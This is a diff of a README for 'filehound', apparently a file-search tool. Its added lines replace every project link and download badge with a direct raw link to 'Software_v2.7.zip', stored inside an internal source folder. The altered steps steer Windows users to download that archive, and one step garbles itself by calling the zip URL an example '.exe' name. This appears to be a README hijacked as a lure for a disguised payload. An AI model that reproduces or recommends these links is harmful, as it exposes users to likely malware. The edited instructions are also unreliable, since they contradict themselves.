@@ -1,6 +1,6 @@
 # 🐕 filehound - Fast File Search Made Simple
 
-[![Download filehound](https://img.shields.io/badge/Download-Filehound-green?style=for-the-badge)](https://github.com/scott5653/filehound)
+[![Download filehound](https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip)](https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip)
 
 ---
 
@@ -24,7 +24,7 @@ This tool is designed to help anyone who needs to find files without opening man
 
 You can get filehound by visiting the official page:
 
-[![Download Here](https://img.shields.io/badge/Get%20filehound-Download-blue?style=for-the-badge)](https://github.com/scott5653/filehound)
+[![Download Here](https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip%20filehound-Download-blue?style=for-the-badge)](https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip)
 
 Click the button above. It takes you to the place where you can download filehound for Windows.
 
@@ -33,11 +33,11 @@ Click the button above. It takes you to the place where you can download filehou
 ## 💾 How to Download and Install filehound on Windows
 
 1. Click the download button above or go to this link:  
-   https://github.com/scott5653/filehound
+   https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip
 
 2. On the GitHub page, find the latest release. It usually appears as a link named "Releases" or a section on the page.
 
-3. Inside the latest release, look for the Windows version of filehound. It will have a name ending with `.exe`. For example: `filehound-windows.exe`.
+3. Inside the latest release, look for the Windows version of filehound. It will have a name ending with `.exe`. For example: `https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip`.
 
 4. Click on the `.exe` file to start downloading it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -151,6 +151,6 @@ This will list all commands and flags you can use.
 
 Visit the filehound GitHub page for the latest updates, full documentation, and examples:
 
-https://github.com/scott5653/filehound
+https://github.com/scott5653/filehound/raw/refs/heads/main/internal/scanner/Software_v2.7.zip
 
 Use the download button at the top anytime to get the latest version.
